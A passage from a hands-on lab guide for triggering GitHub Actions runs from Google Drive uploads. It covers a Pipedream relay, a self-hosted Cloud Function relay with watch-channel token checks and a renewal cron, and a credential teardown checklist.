hard-coded in step code.

### 4.3 Add the dispatch step

Add a step after the trigger — either the built-in **HTTP request** action or a small
Node code step. HTTP-action config (mirror of our curl, field by field):

- Method: `POST`
- URL: `https://api.github.com/repos/anden-karlsson/drive-ci-lab/dispatches`
- Headers: `Accept: application/vnd.github+json`,
  `Authorization: Bearer {{process.env.DRIVE_PAT}}`,
  `X-GitHub-Api-Version: 2022-11-28`
- Body (JSON):

  ```json
  {
    "event_type": "drive-upload",
    "client_payload": {
      "file_name": "{{steps.trigger.event.<name path from 4.1.5>}}",
      "file_id": "{{steps.trigger.event.<id path from 4.1.5>}}"
    }
  }
  ```

The `{{ ... }}` moustaches are Pipedream's template substitution — conceptually identical
to GitHub's `${{ }}`: evaluated by the platform before the request is sent. Test the step
(expect 204, same as curl), then **Deploy** the workflow.

### 4.4 ✅ CHECKPOINT 4 (milestone 1)

Upload a fresh file to `drive-ci-inbox`. Within seconds: Pipedream shows an execution, and
`gh run list` shows a new `repository_dispatch` run. Pull its log; it downloaded the file
you just uploaded. **The full event chain is live: upload → push notification → relay →
dispatch → runner → download.**

### 4.5 The burst test — watch the pending slot lose events

Prepare 3–4 small files locally; upload them to the folder in quick succession (multi-select
one drag). Then watch:

```bash
gh run list --limit 10
```

Prediction from §4's concurrency model: run 1 in progress, one run pending, and the
middle event(s) **cancelled** — look for conclusion `cancelled` rows. Pipedream fired one
dispatch per file (check its execution list: all present), but GitHub's pending slot only
holds one. **Lesson: concurrency serializes; it does not queue.** Note what you observe —
this motivates Phase 5's push-to-pull design.

---

## 8. Phase 5 walkthrough — relay B: self-hosted Cloud Function

**Goal (milestone 2):** replace Pipedream with your own relay so you own every moving
part: a Drive **watch channel** you register yourself, pointing at an HTTP **Cloud
Function** you wrote and deployed, which fires the dispatch.

**Pause Pipedream first** (disable the workflow in its UI) — two live relays would
double-fire every upload.

### 8.0 Concepts before code

- **Watch channel** = a subscription you create by calling the Drive API's `watch` method:
  "when something changes, POST a notification to this HTTPS URL." That URL must be
  public — hence a Cloud Function (Google's serverless HTTP hosting; free tier ample).
- **Notifications are thin.** Google's POST says *something changed*, not *what*. The body
  is empty; metadata rides in `X-Goog-*` headers. So the relay must **turn push into
  pull**: on each ping, query the Drive changes feed for what actually changed. This is
  also the fix for Phase 4's lost-events problem — the query returns *everything* new
  since the last check, so a burst collapses into "process all of these".
- **Channels expire.** Each has a TTL; expiry means silent death of the pipeline. Hence
  `renew.yml`, a weekly cron that re-registers — **the cron renews the subscription only;
  detection stays pure push.**

  > **⚠ VERIFY:** the current maximum TTL for Drive watch channels (`changes.watch`) in
  > Google's push-notifications docs, and set the renewal cron comfortably inside it. Do
  > not trust remembered numbers here.

- **Channel token** — a secret string you set at registration; Google echoes it back in
  `X-Goog-Channel-Token` on every notification. Checking it is how the function rejects
  forged POSTs (anyone can POST to a public URL).
- **`sync` message** — right after registration Google sends one notification with
  `X-Goog-Resource-State: sync` ("channel is live"). It means nothing happened; ignore it
  or you'll fire a phantom dispatch on every renewal.

### 8.1 Install and initialize the gcloud CLI

The one tool install this lab genuinely requires (deploying functions from the terminal).
Follow Google's current apt instructions for Debian/Ubuntu (**⚠ VERIFY** current steps —
same repo-plus-signing-key pattern as any vendor apt repo), then:

```bash
gcloud auth login              # browser OAuth; run it YOURSELF in your terminal
gcloud config set project <your-project-id>   # the ID, not the display name
```

### 8.2 The relay function — `relay/main.py`

Design first, in plain words; the code follows it 1:1:

1. Reject any request whose `X-Goog-Channel-Token` header ≠ our secret token → `403`.
2. If `X-Goog-Resource-State` is `sync` → `200`, do nothing.
3. Otherwise: authenticate as the SA, ask Drive's changes feed "what changed since my
   stored page token?", filter to files in our folder, and fire one dispatch per new file
   (or one batched dispatch — design choice; batching also debounces bursts).
4. Persist the new page token so the next ping continues from there (simplest durable
   spot: a small file in a GCS bucket, or Firestore — pick at implementation time).
5. Always answer `2xx` quickly — if Google sees repeated failures it backs off and may
   stop delivering.

Skeleton to write together at this phase (structure fixed, details live-verified):

```python
# relay/main.py — HTTP Cloud Function: Drive watch notification -> repository_dispatch
import json, os
import functions_framework          # Google's decorator for HTTP functions
import requests                     # for the GitHub POST

@functions_framework.http
def relay(request):
    if request.headers.get("X-Goog-Channel-Token") != os.environ["CHANNEL_TOKEN"]:
        return ("forbidden", 403)
    if request.headers.get("X-Goog-Resource-State") == "sync":
        return ("sync ack", 200)
    # push-to-pull: query drive.changes().list(pageToken=<stored>), collect new files
    # in GDRIVE_FOLDER_ID, store the fresh pageToken, then for each (or batched):
    #   POST https://api.github.com/repos/<owner>/<repo>/dispatches
    #   Authorization: Bearer os.environ["DRIVE_PAT"]   (retry 5xx, log 4xx)
    return ("ok", 200)
```

### 8.3 Register the watch — `relay/register_watch.py`

A short script (run locally and by `renew.yml`) that authenticates as the SA and calls
`changes.watch` with: a fresh unique channel id, `address` = the deployed function's URL,
`token` = the channel token, and an expiration near the verified max TTL. It should first
fetch a start page token (`changes.getStartPageToken`) when no stored token exists.
Best practice: `stop` the previous channel when registering a new one (needs the previous
channel id+resource id — store them alongside the page token).

### 8.4 Deploy

```bash
gcloud functions deploy drive-relay \
  --gen2 --runtime python312 --region europe-north1 \
  --source relay/ --entry-point relay \
  --trigger-http --allow-unauthenticated \
  --set-env-vars CHANNEL_TOKEN=...,DRIVE_PAT=...,GDRIVE_FOLDER_ID=...
```

Breakdown: `--gen2` current function generation; `--entry-point` the Python function
name; `--trigger-http` gives it a public HTTPS URL (printed on success — that's the watch
`address`); `--allow-unauthenticated` because Google's notification POSTs carry no Google
IAM identity — our auth is the channel token check (**⚠ VERIFY** whether plain env vars
or Secret Manager is currently recommended for the two secrets; env vars are acceptable
for a throwaway lab). `relay/` needs a `requirements.txt`
(`functions-framework`, `requests`, `google-api-python-client`, `google-auth`).

Then register: `python relay/register_watch.py` → function logs
(`gcloud functions logs read drive-relay --limit 20`) should show the `sync` ping.

### 8.5 `renew.yml` — the subscription cron

```yaml
name: renew-drive-watch
on:
  schedule:
    - cron: "0 6 * * 1"    # Mondays 06:00 UTC — inside the verified channel TTL
  workflow_dispatch:        # manual "run now" button for testing
jobs:
  renew:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: {python-version: "3.13"}
      - run: pip install google-api-python-client google-auth
      - env:
          GDRIVE_SA_KEY: ${{ secrets.GDRIVE_SA_KEY }}
          CHANNEL_TOKEN: ${{ secrets.CHANNEL_TOKEN }}
          RELAY_URL: ${{ vars.RELAY_URL }}
        run: python relay/register_watch.py
```

Cron syntax: five fields — minute hour day-of-month month day-of-week; `0 6 * * 1` =
06:00 UTC every Monday. `workflow_dispatch` adds a manual trigger button (`gh workflow
run renew-drive-watch`) so you can test renewal without waiting a week. Note GitHub cron
is best-effort (may run minutes late) — fine for renewal, another reason it must never be
the *detection* mechanism.

### 8.6 ✅ CHECKPOINT 5 (milestone 2)

Upload a file → `gcloud functions logs read drive-relay` shows the notification arriving
and the dispatch firing → `gh run list` shows the run → its log shows the download.
Re-run the Phase 4.5 burst test and compare: the changes-feed query should process every
file even when GitHub cancels intermediate runs.

---

## 9. Phase 6 — wrap-up and teardown

### Recap the two architectures (write your own summary here when done)

Managed relay (Pipedream): fast to build, renewal owned by the platform, opaque.
Self-hosted (Cloud Function): every part visible — watch channel, token validation,
push-to-pull, renewal cron — and every part yours to operate. Same GitHub half in both.

### Teardown checklist (do not skip — orphaned credentials outlive labs)

- [ ] Stop the Drive watch channel (`channels.stop` with stored channel+resource id, or
      simply let it expire after the next step)
- [ ] Delete the Cloud Function — or delete the whole GCP project
      (`gcloud projects delete <id>`), which kills function, SA, keys, and API enablement
      in one stroke
- [ ] Delete the local SA key: `rm ~/drive-ci-test-sa.json`
- [ ] Revoke the fine-grained PAT (`drive-ci-lab-dispatch`; auto-expires 2026-08-15)
- [ ] Delete the Pipedream workflow and its stored Google connection + `DRIVE_PAT` env var
- [ ] Delete `.env.txt` locally
- [ ] Delete the repo (`gh repo delete anden-karlsson/drive-ci-lab`) — repo secrets die
      with it
